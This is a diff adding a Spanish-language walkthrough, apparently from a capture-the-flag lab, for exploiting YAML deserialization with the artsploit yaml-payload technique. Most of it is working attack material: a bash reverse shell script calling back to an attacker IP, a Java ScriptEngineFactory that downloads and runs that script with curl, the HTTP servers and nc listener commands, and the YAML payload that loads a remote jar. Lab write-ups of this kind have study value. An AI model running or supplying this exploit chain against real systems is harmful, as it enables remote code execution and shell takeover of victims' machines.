@@ -1,0 +1,60 @@
+Repositorio referencia https://github.com/artsploit/yaml-payload
+
+El objetivo es que descargue del equipo atacante un scrip que crea una reverse shell en bash
+
+Lo primero es crear el script chungo llamado caca.sh en bash
+
+#!/bin/sh
+bash -i >& /dev/tcp/10.10.14.165/6666 0>&1
+
+A continuación se modificara el fichero /yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java para que ejecute el script anterior
+
+package artsploit;
+
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.io.IOException;
+import java.util.List;
+
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec("curl http://10.10.14.165:8888/caca.sh -o /tmp/caca.sh");
+            Runtime.getRuntime().exec("bash /tmp/caca.sh");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+......
+......
+......
+
+Ahora hay que crear un servidor web en python en el puerto 8888 para que pueda descargar la maquina víctima el script caca.sh
+
+python3 -m http.server 8888
+
+El siguiente paso es compilar el código tal y como se muestra en el repositorio de github desde la carpeta raiz del repositorio
+
+javac src/artsploit/AwesomeScriptEngineFactory.java
+
+Y despues
+
+jar -cvf yaml-payload.jar -C src/ .
+
+Ahora hay que levantar otro servidor web para que la máquina victima pueda descargar el codigo java compilado
+
+python3 -m http.server 80
+
+También hay que levantar la escucha para la reverse shell
+
+nc -nlvp 6666
+
+Por último tal y como se muestra en el repositorio de git hay que añadir el siguiente código a la consola de YAML para que descargue el codigo java previamente compilado
+
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.10.10/yaml-payload.jar"]
+  ]]
+]
+
